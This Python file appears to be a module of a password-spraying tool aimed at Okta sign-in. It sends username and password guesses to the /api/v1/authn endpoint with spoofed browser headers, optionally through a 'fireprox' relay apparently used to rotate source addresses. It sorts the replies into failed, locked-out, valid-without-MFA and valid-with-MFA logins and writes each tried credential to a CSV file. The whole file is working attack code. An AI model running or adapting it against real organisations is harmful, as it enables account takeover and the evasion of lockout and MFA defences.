import csv
import json

import requests


# Adapted from: https://github.com/Rhynorater/Okta-Password-Sprayer/blob/master/oSpray.py
class Okta:
    def __init__(self, host, port, timeout, fireprox):
        self.timeout = timeout
        self.url = f"https://{host}:{port}/api/v1/authn"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/api/v1/authn"

        self.headers = {
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "X-Okta-User-Agent-Extended": "okta-signin-widget-2.12.0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en",
            "Content-Type": "application/json",
        }

        self.data = {
            "username": "",
            "options": {
                "warnBeforePasswordExpired": "true",
                "multiOptionalFactorEnroll": "true",
            },
            "password": "",
        }

    def set_username(self, username):
        self.data["username"] = username

    def set_password(self, password):
        self.data["password"] = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url, headers=self.headers, json=self.data, timeout=self.timeout
        )  # , verify=False, proxies=self.proxyDict)
        return response

    # handle CSV out output headers. Can be customized per module
    def print_headers(self, csvfile):
        # print table headers
        print(
            "%-13s %-30s %-35s %-17s %-13s %-15s"
            % (
                "Result",
                "Message",
                "Username",
                "Password",
                "Response Code",
                "Response Length",
            )
        )
        print("-" * 128)

        # create CSV file
        output = open(csvfile, "w")
        fieldnames = [
            "Result",
            "Message",
            "Username",
            "Password",
            "Response Code",
            "Response Length",
        ]
        output_writer = csv.DictWriter(output, delimiter=",", fieldnames=fieldnames)
        output_writer.writeheader()
        output.close()

    # handle target's response evaluation. Can be customized per module
    def print_response(self, response, csvfile, timeout=False):
        if timeout:
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))

        data = response.json()

        if "errorSummary" in data.keys():
            # standard fail
            if data["errorSummary"] == "Authentication failed":
                result = "Fail"
                message = ""

        elif response.status_code == 200 and "status" in data.keys():
            # Account lockout
            if data["status"] == "LOCKED_OUT":
                result = "Fail"
                message = "Account appears locked"

            # Valid and not enrolled in MFA yet
            elif data["status"] == "MFA_ENROLL":
                result = "Success"
                message = "Valid login; no MFA"

            # Valid (and enrolled in MFA?)
            else:
                result = "Success"
                message = (
                    "Valid login; may have MFA"  # currently unsure of MFA in this case
                )

        # failsafe for all other cases
        else:
            result = "Fail"
            message = "Unknown result returned"

        # print result to screen
        print(
            "%-13s %-30s %-35s %-17s %13s %15s"
            % (
                result,
                message,
                self.data["username"],
                self.data["password"],
                code,
                length,
            )
        )

        # print to CSV file
        output = open(csvfile, "a")
        output.write(
            f'{result},{message},{self.data["username"]},{self.data["password"]},{code},{length}\n'
        )
        output.close()
